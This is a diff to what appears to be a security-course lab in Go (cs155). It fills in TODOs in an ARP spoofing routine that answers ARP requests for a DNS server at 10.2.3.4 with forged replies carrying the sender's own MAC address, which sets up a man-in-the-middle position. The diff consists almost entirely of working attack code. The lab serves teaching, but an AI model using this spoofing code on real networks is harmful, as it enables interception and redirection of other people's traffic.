@@ -88,7 +88,10 @@ func handleARPPacket(packet gopacket.Packet) {
 			dstIP := net.IP(arpData.DstProtAddress)
 			// filter for ARP request coming to DNS server
 			if dstIP.String() == "10.2.3.4" {
+				intercept := ARPIntercept{arpData.SourceHwAddress, arpData.SourceProtAddress,
+					arpData.DstHwAddress, arpData.DstProtAddress}
 
+				sendRawEthernet(spoofARP(intercept))
 			}
 			// Hint:	Store all the data you need in the ARPIntercept struct and
 			//			pass it to spoofARP(). spoofARP() returns a slice of bytes,
@@ -109,6 +112,10 @@ type ARPIntercept struct {
 
 	// Hint:	The types net.HardwareAddr and net.IP are the best way to represent
 	//			a hardware address and an IP address respectively.
+	SourceHwAddress   net.HardwareAddr
+	SourceProtAddress net.IP
+	DstHwAddress      net.HardwareAddr
+	DstProtAddress    net.IP
 }
 
 /*
@@ -130,20 +137,20 @@ func spoofARP(intercept ARPIntercept) []byte {
 
 	// TODO #3: Fill in the missing fields below to construct your spoofed ARP response
 	arp := &layers.ARP{
-		AddrType:        layers.LinkTypeEthernet,
-		Protocol:        layers.EthernetTypeIPv4,
-		HwAddressSize:   6, // number of bytes in a MAC address
-		ProtAddressSize: 4, // number of bytes in an IPv4 address
-		Operation:       2, // Indicates this is an ARP reply
-		// SourceHwAddress:		TODO,
-		// SourceProtAddress: 	TODO,
-		// DstHwAddress:		TODO,
-		// DstProtAddress:		TODO,
+		AddrType:          layers.LinkTypeEthernet,
+		Protocol:          layers.EthernetTypeIPv4,
+		HwAddressSize:     6, // number of bytes in a MAC address
+		ProtAddressSize:   4, // number of bytes in an IPv4 address
+		Operation:         2, // Indicates this is an ARP reply
+		SourceHwAddress:   cs155.GetLocalMAC(),
+		SourceProtAddress: intercept.DstProtAddress,
+		DstHwAddress:      intercept.SourceHwAddress,
+		DstProtAddress:    intercept.SourceProtAddress,
 	}
 	ethernet := &layers.Ethernet{
 		EthernetType: layers.EthernetTypeARP,
-		// SrcMAC:				TODO,
-		// DstMAC:				TODO,
+		SrcMAC:       cs155.GetLocalMAC(),
+		DstMAC:       intercept.SourceHwAddress,
 	}
 
 	// Now that the packet is ready to be sent, we need to "flatten" its
